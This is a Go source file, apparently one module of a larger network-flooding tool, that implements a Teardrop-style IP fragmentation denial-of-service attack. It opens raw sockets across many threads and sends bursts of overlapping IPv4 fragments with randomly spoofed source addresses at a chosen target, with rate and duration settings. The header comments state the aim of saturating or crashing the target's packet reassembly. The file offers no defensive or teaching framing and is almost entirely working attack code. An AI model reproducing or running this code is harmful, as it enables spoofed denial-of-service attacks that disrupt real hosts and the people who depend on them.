// ip_fragmentation.go — IP Fragmentation (Teardrop/Overlap) Attack.
// Builds fragmented IPv4 packets with overlapping offsets or the MF (More Fragments) bit.
// This forces the target's IP reassembly buffer to saturate or crash (Teardrop/Rose).
package main

import (
	"context"
	"encoding/binary"
	"fmt"
	"math/rand"
	"net"
	"runtime"
	"sync"
	"time"
)


// startIPFragmentation performs a Teardrop-style fragmentation attack.
// It sends multiple fragments with overlapping offsets to confuse reassembly.
func startIPFragmentation(ctx context.Context, opts ContextOpts, targetIP string, threads int, duration time.Duration, pps int) {
	fmt.Printf("[FRAG] IP Fragmentation on %s | threads=%d | dur=%v | max_pps=%d\n",
		targetIP, threads, duration, pps)

	dstIP := net.ParseIP(targetIP).To4()
	if dstIP == nil {
		fmt.Printf("[FRAG] Invalid target IP: %s\n", targetIP)
		return
	}

	var wg sync.WaitGroup


	for i := 0; i < threads; i++ {
		wg.Add(1)
		go func(threadID int) {
			defer func() { if r := recover(); r != nil { LogErr("SYS", "Panic in FRAG: %v", r) } }()
			defer wg.Done()
			runtime.LockOSThread()
			defer runtime.UnlockOSThread()

			src := rand.NewSource(time.Now().UnixNano() + int64(threadID))
			localRand := rand.New(src)

			// Socket per thread
			sockFd, err := openRawSocket(IPPROTO_RAW)
			if err != nil {
				return
			}
			defer closeSocket(sockFd)

			for {
				select {
				case <-ctx.Done():
					return
				default:
					if pps > 0 {
						time.Sleep(time.Second / time.Duration(pps/threads+1))
					}
				}

				if sockFd != InvalidSocket {
					sendFragmentationBurst(sockFd, dstIP, localRand)
					AddStats(2, 200) // ~2 fragments per burst
				} else {
					time.Sleep(10 * time.Millisecond)
				}
			}
		}(i)
	}

	<-ctx.Done()
	wg.Wait()

	fmt.Println("[FRAG] IP Fragmentation finished")
}

// sendFragmentationBurst sends a pair of overlapping fragments.
func sendFragmentationBurst(sockFd SocketHandle, dstIP net.IP, localRand *rand.Rand) {
	srcIP := randomPublicIPLocal(localRand)
	id := uint16(localRand.Intn(65535))

	// Fragment 1: Normal-ish but with MF bit set
	// Total length: 20 (IP) + 36 (Payload) = 56
	// Offset: 0, MF: 1
	pkt1 := buildIPHeaderWithFrag(srcIP, dstIP, id, 0, true, 56)
	pkt1 = append(pkt1, make([]byte, 36)...)
	localRand.Read(pkt1[20:])

	// Fragment 2: Overlapping fragment (Teardrop)
	// Total length: 20 (IP) + 24 (Payload) = 44
	// Offset: 3 (24 bytes into pkt1), MF: 0
	// 3 * 8 = 24 bytes offset
	pkt2 := buildIPHeaderWithFrag(srcIP, dstIP, id, 3, false, 44)
	pkt2 = append(pkt2, make([]byte, 24)...)
	localRand.Read(pkt2[20:])

	sendtoRaw(sockFd, pkt1, dstIP, 0)
	sendtoRaw(sockFd, pkt2, dstIP, 0)
}

// buildIPHeaderWithFrag builds an IPv4 header with specific fragmentation fields.
func buildIPHeaderWithFrag(srcIP, dstIP net.IP, id uint16, offset uint16, mf bool, totalLen int) []byte {
	hdr := make([]byte, 20)
	hdr[0] = 0x45 // Version 4, IHL 5
	hdr[1] = 0x00 // TOS
	binary.BigEndian.PutUint16(hdr[2:], uint16(totalLen))
	binary.BigEndian.PutUint16(hdr[4:], id)

	// Flags/Offset
	// Flags: 3 bits (Reserved, DF, MF)
	// Offset: 13 bits (units of 8 bytes)
	var fragField uint16 = offset & 0x1FFF
	if mf {
		fragField |= 0x2000 // MF bit
	}
	binary.BigEndian.PutUint16(hdr[6:], fragField)

	hdr[8] = 64          // TTL
	hdr[9] = IPPROTO_UDP // Use UDP as placeholder protocol
	copy(hdr[12:16], srcIP.To4())
	copy(hdr[16:20], dstIP.To4())

	// Checksum
	binary.BigEndian.PutUint16(hdr[10:], 0) // reset before calc
	binary.BigEndian.PutUint16(hdr[10:], checksum(hdr))

	return hdr
}
